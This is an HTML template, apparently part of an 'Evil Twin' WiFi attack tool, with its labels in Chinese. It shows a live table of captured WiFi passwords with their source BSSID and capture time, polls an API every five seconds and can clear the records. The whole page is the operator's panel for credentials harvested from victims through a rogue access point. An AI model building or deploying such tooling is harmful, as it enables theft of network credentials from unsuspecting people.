<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>密码记录 - Evil Twin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { color: #e94560; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; background: #16213e; border-radius: 10px; overflow: hidden; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { background: #0f3460; color: #e94560; }
        .password { font-family: monospace; font-size: 16px; font-weight: bold; color: #4ecdc4; }
        .btn { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
        .btn-danger { background: #dc3545; }
        .nav-link { color: #4ecdc4; text-decoration: none; margin-right: 15px; }
        .warning { color: #ffaa00; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1> 捕获的WiFi密码 (最近10条)</h1>
        <div style="margin-bottom: 15px;">
            <a href="/" class="nav-link">← 返回首页</a>
            <button class="btn btn-danger" onclick="clearAll()">️ 清空所有记录</button>
        </div>
        
        <table id="password_table">
            <thead>
                <tr><th>ID</th><th>密码</th><th>来源IP/BSSID</th><th>捕获时间</th></tr>
            </thead>
            <tbody id="password_body">
                {% for p in passwords %}
                <tr>
                    <td>{{ p.id }}</td>
                    <td class="password">{{ p.password }}</td>
                    <td>{{ p.bssid or '未知' }}</td>
                    <td>{{ p.captured_at }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        <div class="warning">⚠️ 超过10条时，系统会自动删除最旧的记录</div>
    </div>
    
    <script>
        async function loadPasswords() {
            const response = await fetch('/api/passwords');
            const passwords = await response.json();
            const tbody = document.getElementById('password_body');
            tbody.innerHTML = '';
            passwords.forEach(p => {
                const row = tbody.insertRow();
                row.insertCell(0).innerText = p.id;
                row.insertCell(1).innerHTML = `<span class="password">${p.password}</span>`;
                row.insertCell(2).innerText = p.bssid || '未知';
                row.insertCell(3).innerText = p.captured_at;
            });
        }
        
        async function clearAll() {
            if (confirm('确定要清空所有密码记录吗？')) {
                await fetch('/api/passwords', { method: 'DELETE' });
                loadPasswords();
            }
        }
        
        setInterval(loadPasswords, 5000);
    </script>
</body>
</html>
